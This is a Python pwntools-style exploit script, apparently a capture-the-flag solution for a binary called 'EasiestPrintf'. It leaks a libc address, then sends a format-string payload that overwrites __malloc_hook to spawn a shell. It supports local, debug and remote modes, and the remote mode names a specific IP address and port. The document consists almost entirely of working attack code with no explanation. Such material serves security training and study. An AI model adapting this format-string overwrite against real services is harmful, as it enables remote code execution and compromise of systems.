#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './EasiestPrintf'
context.arch = 'x86'
context.log_level= 'INFO'
mode = args['MODE'].lower()
os.environ['LD_LIBRARY_PATH'] = os.curdir
# os.environ['LD_PRELOAD'] = './nosleep.so'

elf = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')

def exploit():
    EXIT_GOT = 0x08049FCC

    if mode == 'debug':
        io = debug(binary)
        io.b([
            # 0x08048829,
        ])
        io.r()
    elif mode == 'remote':
        io = remote('202.120.7.210', 12321)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    io.sendlineafter('read:', EXIT_GOT)
    exit_addr = int(io.recvline_startswith('0x'), 16)
    libc_base_addr = exit_addr - libc.symbols['_exit']
    log.info('libc base address: %#x', libc_base_addr)

    malloc_hook_addr = libc_base_addr + libc.symbols['__malloc_hook']
    system_addr = libc_base_addr + libc.symbols['system']
    binsh_addr = libc_base_addr + libc.search('/bin/sh').next()

    system_addr = 0x08048911
    system_addr = libc_base_addr + 0x3e297

    log.info('write %#x to %#x', malloc_hook_addr, system_addr)
    payload = p32(malloc_hook_addr)
    payload += p32(malloc_hook_addr + 1)
    payload += p32(malloc_hook_addr + 3)
    payload += p32(malloc_hook_addr + 5)
    payload += p32(malloc_hook_addr + 7)
    payload += '==%50$08x==%224c'
    payload += '%{}c%7$hhn'.format(system_addr & 0xff)
    aim = (p32(system_addr) + p32(binsh_addr))[1:-1]
    written = system_addr & 0xff
    written += 0x100
    for i in xrange(3):
        to_write = u16(aim[i << 1:][:2], signed=False)
        cnt = (to_write - written) % 0x10000
        written = to_write
        payload += '%{}c%{}$hn'.format(cnt, 8 + i)
    cnt = ((binsh_addr >> 24) - written) % 0x100
    payload += '%{}c%{}$hhn'.format(cnt, 11)
    io.sendline(payload + '%1000000c')

    io.clean()
    # io.recvuntil('==')
    # stack_ptr = int(io.recvuntil('==', drop=True), 16)
    # printf_ret_addr = stack_ptr - 76896

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
        # b *0x0804881C
        # b system
        # b malloc
        # b __call_tls_dtors
        # '''.strip().split('\n'))

    io.interactive()

if __name__ == '__main__':
    exploit()
